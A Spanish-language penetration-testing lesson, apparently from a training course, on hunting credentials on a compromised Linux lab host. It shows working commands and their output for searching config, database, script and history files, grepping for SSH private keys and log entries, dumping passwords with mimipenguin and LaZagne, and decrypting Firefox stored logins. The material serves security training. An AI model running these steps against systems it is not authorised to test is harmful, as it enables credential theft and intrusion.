Buscar credenciales es uno de los primeros pasos una vez que tenemos acceso al sistema. Estos frutos al alcance pueden darnos privilegios elevados en segundos o minutos. Entre otras cosas, esto es parte del proceso de escalada de privilegios locales que cubriremos aquí. Sin embargo, es importante señalar que estamos lejos de cubrir todas las situaciones posibles y, por lo tanto, nos centramos en los diferentes enfoques.

Podemos imaginar que hemos obtenido acceso a un sistema a través de una aplicación web vulnerable y, por lo tanto, hemos obtenido un reverse shell, por ejemplo. Para escalar nuestros privilegios de manera más eficiente, podemos buscar contraseñas o incluso credenciales completas que podamos usar para iniciar sesión en nuestro objetivo. Hay varias fuentes que pueden proporcionarnos credenciales que ponemos en cuatro categorías. Estas incluyen, pero no se limitan a:

| **`Files`**  | **`History`**        | **`Memory`**         | **`Key-Rings`**            |
| ------------ | -------------------- | -------------------- | -------------------------- |
| Configs      | Logs                 | Cache                | Browser stored credentials |
| Databases    | Command-line History | In-memory Processing |                            |
| Notes        |                      |                      |                            |
| Scripts      |                      |                      |                            |
| Source codes |                      |                      |                            |
| Cronjobs     |                      |                      |                            |
| SSH Keys     |                      |                      |                            |

Enumerar todas estas categorías nos permitirá aumentar la probabilidad de encontrar credenciales de usuarios existentes en el sistema con cierta facilidad. Hay innumerables situaciones diferentes en las que siempre veremos resultados diferentes. Por lo tanto, debemos adaptar nuestro enfoque a las circunstancias del entorno y mantener en mente el panorama general. Sobre todo, es crucial tener en cuenta cómo funciona el sistema, su enfoque, el propósito por el cual existe y el papel que desempeña en la lógica empresarial y en la red en general. Por ejemplo, supongamos que es un servidor de bases de datos aislado. En ese caso, no necesariamente encontraremos usuarios normales allí, ya que es una interfaz sensible en la gestión de datos a la que solo unas pocas personas tienen acceso.

---

## Files

Un principio fundamental de Linux es que todo es un archivo. Por lo tanto, es crucial tener en cuenta este concepto y buscar, encontrar y filtrar los archivos apropiados según nuestros requisitos. Debemos buscar, encontrar e inspeccionar varias categorías de archivos uno por uno. Estas categorías son las siguientes:

| Configuration files | Databases | Notes    |
| ------------------- | --------- | -------- |
| Scripts             | Cronjobs  | SSH keys |

Los archivos de configuración son el núcleo de la funcionalidad de los servicios en distribuciones de Linux. A menudo incluso contienen credenciales que podremos leer. Su análisis también nos permite entender cómo funciona el servicio y sus requisitos con precisión. Por lo general, los archivos de configuración están marcados con las siguientes tres extensiones de archivo (`.config`, `.conf`, `.cnf`). Sin embargo, estos archivos de configuración o los archivos de extensión asociados pueden ser renombrados, lo que significa que estas extensiones de archivo no son necesariamente requeridas. Además, incluso al recompilar un servicio, el nombre de archivo requerido para la configuración básica puede cambiarse, lo que tendría el mismo efecto. Sin embargo, este es un caso raro que no encontraremos a menudo, pero esta posibilidad no debe excluirse de nuestra búsqueda.

La parte más crucial de cualquier enumeración del sistema es obtener una visión general del mismo. Por lo tanto, el primer paso debe ser encontrar todos los archivos de configuración posibles en el sistema, que luego podemos examinar y analizar individualmente con más detalle. Hay muchos métodos para encontrar estos archivos de configuración, y con el siguiente método, veremos que hemos reducido nuestra búsqueda a estas tres extensiones de archivo.

### Configuration Files

```r
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

Opcionalmente, podemos guardar el resultado en un archivo de texto y usarlo para examinar los archivos individuales uno tras otro. Otra opción es ejecutar el escaneo directamente para cada archivo encontrado con la extensión de archivo especificada y mostrar el contenido. En este ejemplo, buscamos tres palabras (`user`, `password`, `pass`) en cada archivo con la extensión de archivo `.cnf`.

### Credentials in Configuration Files

```r
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

Podemos aplicar esta simple búsqueda a las otras extensiones de archivo también. Además, podemos aplicar este tipo de búsqueda a bases de datos almacenadas en archivos con diferentes extensiones de archivo y luego leerlos.

### Databases

```r
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache

/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

Dependiendo del entorno en el que nos encontremos y del propósito del host en el que estemos, a menudo podemos encontrar notas sobre procesos específicos en el sistema. Estas a menudo incluyen listas de muchos puntos de acceso diferentes o incluso sus credenciales. Sin embargo, a menudo es difícil encontrar notas de inmediato si se almacenan en algún lugar del sistema y no en el escritorio o en sus subcarpetas. Esto se debe a que pueden tener cualquier nombre y no necesariamente deben tener una extensión de archivo específica, como `.txt`. Por lo tanto, en este caso, necesitamos buscar archivos que incluyan la extensión de archivo `.txt` y archivos que no tengan ninguna extensión de archivo.

### Notes

```r
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
```

Los scripts son archivos que a menudo contienen información y procesos altamente sensibles. Entre otras cosas, también contienen credenciales que son necesarias para poder llamar y ejecutar los procesos automáticamente. De lo contrario, el administrador o desarrollador tendría que ingresar la contraseña correspondiente cada vez que se llama al script o al programa compilado.

### Scripts

```r
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

Los cronjobs son ejecuciones independientes de comandos, programas y scripts. Estos se dividen en el área a nivel de sistema (`/etc/crontab`) y ejecuciones dependientes del usuario. Algunas aplicaciones y scripts requieren credenciales para ejecutarse y, por lo tanto, se ingresan incorrectamente en los cronjobs. Además, hay áreas que se dividen en diferentes rangos de tiempo (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). Los scripts y archivos utilizados por `cron` también se pueden encontrar en `/etc/cron.d/` para distribuciones basadas en Debian.

### Cronjobs

```r
cry0l1t3@unixclient:~$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

```r
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
```

### SSH Keys

Las claves SSH pueden considerarse "tarjetas de acceso" para el protocolo SSH utilizado para el mecanismo de autenticación de clave pública. Se genera un archivo para el cliente (`Private key`) y uno correspondiente para el servidor (`Public key`). Sin embargo, estos no son iguales, por lo que conocer la `public key` no es suficiente para encontrar una `private key`. La `public key` puede verificar firmas generadas por la clave SSH privada y así permite el inicio de sesión automático en el servidor. Incluso si personas no autorizadas obtienen la clave pública, es casi imposible calcular la privada correspondiente a partir de ella. Al conectarse al servidor usando la clave SSH privada, el servidor verifica si la clave privada es válida y permite al cliente iniciar sesión en consecuencia. Por lo tanto, no se necesitan contraseñas para conectarse a través de SSH.

Dado que las claves SSH pueden ser nombradas arbitrariamente, no podemos buscarlas por nombres específicos. Sin embargo, su formato nos permite identificarlas de manera única porque, ya sea clave pública o privada, ambas tienen primeras líneas únicas para distinguirlas.

### SSH Private Keys

```r
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

### SSH Public Keys

```r
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

---

## History

Todos los archivos de historial proporcionan información crucial sobre el curso actual y pasado de los procesos. Nos interesan los archivos que almacenan el historial de comandos de los usuarios y los logs que almacenan información sobre los procesos del sistema.

En el historial de los comandos ingresados en distribuciones de Linux que usan Bash como shell estándar, encontramos los archivos asociados en `.bash_history`. Sin embargo, otros archivos como `.bashrc` o `.bash_profile` pueden contener información importante.

### Bash

 History

```r
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

### Logs

Un concepto esencial de los sistemas Linux son los archivos de registro que se almacenan en archivos de texto. Muchos programas, especialmente todos los servicios y el propio sistema, escriben tales archivos. En ellos, encontramos errores del sistema, detectamos problemas relacionados con los servicios o seguimos lo que el sistema está haciendo en segundo plano. El conjunto de archivos de registro se puede dividir en cuatro categorías:

|**Application Logs**|**Event Logs**|**Service Logs**|**System Logs**|
|---|---|---|---|

Existen muchos registros diferentes en el sistema. Estos pueden variar según las aplicaciones instaladas, pero aquí hay algunos de los más importantes:

|**Log File**|**Description**|
|---|---|
|`/var/log/messages`|Registros de actividad del sistema genéricos.|
|`/var/log/syslog`|Registros de actividad del sistema genéricos.|
|`/var/log/auth.log`|(Debian) Todos los registros relacionados con la autenticación.|
|`/var/log/secure`|(RedHat/CentOS) Todos los registros relacionados con la autenticación.|
|`/var/log/boot.log`|Información de arranque.|
|`/var/log/dmesg`|Información y registros relacionados con hardware y controladores.|
|`/var/log/kern.log`|Advertencias, errores y registros relacionados con el kernel.|
|`/var/log/faillog`|Intentos de inicio de sesión fallidos.|
|`/var/log/cron`|Información relacionada con trabajos cron.|
|`/var/log/mail.log`|Todos los registros relacionados con el servidor de correo.|
|`/var/log/httpd`|Todos los registros relacionados con Apache.|
|`/var/log/mysqld.log`|Todos los registros relacionados con el servidor MySQL.|

Cubrir el análisis detallado de estos archivos de registro sería ineficiente en este caso. Por lo tanto, en este punto, deberíamos familiarizarnos con los registros individuales, examinándolos manualmente y entendiendo sus formatos. Sin embargo, aquí hay algunas cadenas que podemos usar para encontrar contenido interesante en los registros:

```r
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
```

---

## Memory and Cache

Muchas aplicaciones y procesos trabajan con credenciales necesarias para la autenticación y las almacenan ya sea en memoria o en archivos para que puedan reutilizarse. Por ejemplo, pueden ser las credenciales necesarias para los usuarios que han iniciado sesión. Otro ejemplo son las credenciales almacenadas en los navegadores, que también pueden leerse. Para recuperar este tipo de información de distribuciones de Linux, existe una herramienta llamada [mimipenguin](https://github.com/huntergregal/mimipenguin) que facilita todo el proceso. Sin embargo, esta herramienta requiere permisos de administrador/root.

### Memory - Mimipenguin

```r
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

Una herramienta aún más poderosa que podemos usar, mencionada anteriormente en la sección Credential Hunting in Windows, es `LaZagne`. Esta herramienta nos permite acceder a muchos más recursos y extraer las credenciales. Las contraseñas y hashes que podemos obtener provienen de las siguientes fuentes, pero no se limitan a ellas:

| Wifi            | Wpa_supplicant | Libsecret | Kwallet      |
|-----------------|----------------|-----------|--------------|
| Chromium-based  | CLI            | Mozilla   | Thunderbird  |
| Git             | Env_variable   | Grub      | Fstab        |
| AWS             | Filezilla      | Gftp      | SSH          |
| Apache          | Shadow         | Docker    | KeePass      |
| Mimipy          | Sessions       |           | Keyrings     |

Por ejemplo, `Keyrings` se utilizan para el almacenamiento y gestión segura de contraseñas en distribuciones de Linux. Las contraseñas se almacenan cifradas y protegidas con una contraseña maestra. Es un gestor de contraseñas basado en el sistema operativo, que discutiremos más adelante en otra sección. De esta manera, no necesitamos recordar cada contraseña y podemos guardar entradas de contraseña repetidas.

### Memory - LaZagne

```r
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

### Browsers

Los navegadores almacenan las contraseñas guardadas por el usuario en forma cifrada localmente en el sistema para que puedan reutilizarse. Por ejemplo, el navegador `Mozilla Firefox` almacena las credenciales cifradas en una carpeta oculta para el usuario respectivo. Estas a menudo incluyen los nombres de los campos asociados, URLs y otra información valiosa.

Por ejemplo, cuando almacenamos credenciales para una página web en el navegador Firefox, se cifran y almacenan en `logins.json` en el sistema. Sin embargo, esto no significa que estén seguras allí. Muchos empleados almacenan dichos datos de inicio de sesión en su navegador sin sospechar que pueden ser descifrados fácilmente y utilizados en contra de la empresa.

### Firefox Stored Credentials

```r
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default


```

```r
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

La herramienta [Firefox Decrypt](https://github.com/unode/firefox_decrypt) es excelente para descifrar estas credenciales y se actualiza regularmente. Requiere Python 3.9 para ejecutar la última versión. De lo contrario, debe usarse `Firefox Decrypt 0.7.0` con Python 2.

### Decrypting Firefox Credentials

```r
python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Alternativamente, `LaZagne` también puede devolver resultados si el usuario ha utilizado el navegador compatible.

### Browsers - LaZagne

```r
cry0l1t3@unixclient:~$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```